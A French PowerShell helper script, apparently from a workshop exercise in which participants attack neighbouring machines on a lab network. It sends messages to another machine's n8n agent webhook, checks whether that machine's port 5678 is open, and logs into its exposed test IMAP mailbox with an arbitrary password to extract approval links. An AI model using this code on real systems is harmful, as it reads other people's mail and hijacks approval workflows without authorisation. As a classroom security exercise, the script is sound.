# Jour 4 : envoyer un message au webhook d'un AUTRE poste (attaque croisée, test du voisin).
# Chargement :  . .\scripts\reseau.ps1
# Exemples   :  Envoyer-Vers 192.168.1.42 agent @{ expediteur = 'b.martin@agence.test'; texte = 'Bonjour' }
#               Envoyer-Vers 192.168.1.42 agent-durci @{ expediteur = '...'; texte = '...' } -Cle 'cle-du-site'
function Envoyer-Vers($hote, $chemin, $corps, $Cle) {
  $json = $corps | ConvertTo-Json
  $entetes = @{}
  if ($Cle) { $entetes['X-Cle-Agence'] = $Cle }
  try {
    Invoke-RestMethod -Method Post -Uri "http://${hote}:5678/webhook/$chemin" -Headers $entetes `
      -ContentType 'application/json; charset=utf-8' -TimeoutSec 600 `
      -Body ([Text.Encoding]::UTF8.GetBytes($json))
  } catch {
    $r = $_.Exception.Response
    if (-not $r) { return "Injoignable : $($_.Exception.Message)" }
    $msg = (New-Object IO.StreamReader($r.GetResponseStream())).ReadToEnd()
    "Refusé : HTTP $([int]$r.StatusCode) $msg"
  }
}
# Attaque croisée : lit le dernier e-mail d'une boîte de test (IMAP 3143) d'un autre poste
# et affiche son objet et ses liens d'approbation. Ne fonctionne que si la messagerie du voisin est exposée.
function Lire-Boite($hote, $boite = 'responsable@agence.test') {
  try { $c = New-Object Net.Sockets.TcpClient($hote, 3143) } catch { return "Injoignable : ${hote}:3143 refuse la connexion" }
  $s = $c.GetStream(); $r = New-Object IO.StreamReader($s); $w = New-Object IO.StreamWriter($s); $w.AutoFlush = $true
  $null = $r.ReadLine()
  $w.WriteLine("a1 LOGIN $boite nimporte"); do { $l = $r.ReadLine() } until ($l -like 'a1 *')
  $n = 0; $w.WriteLine('a2 SELECT INBOX')
  do { $l = $r.ReadLine(); if ($l -match '^\* (\d+) EXISTS') { $n = [int]$matches[1] } } until ($l -like 'a2 *')
  if ($n -eq 0) { $c.Close(); return 'Boîte vide' }
  $w.WriteLine("a3 FETCH $n (BODY[HEADER.FIELDS (SUBJECT)] BODY[TEXT])"); $t = ''
  do { $l = $r.ReadLine(); $t += $l + "`n" } until ($l -like 'a3 *')
  $c.Close()
  $t = ($t -replace "=`r?`n", '') -replace '=3D', '='
  "$n e-mail(s) dans $boite"
  [regex]::Matches($t, 'https?://[^"\s<>]+approved=(true|false)[^"\s<>]*') | ForEach-Object { $_.Value -replace '&amp;', '&' } | Select-Object -Unique
}
# Le poste du voisin répond-il sur le port de n8n ?
function Tester-Poste($hote) { Test-NetConnection $hote -Port 5678 -InformationLevel Quiet }
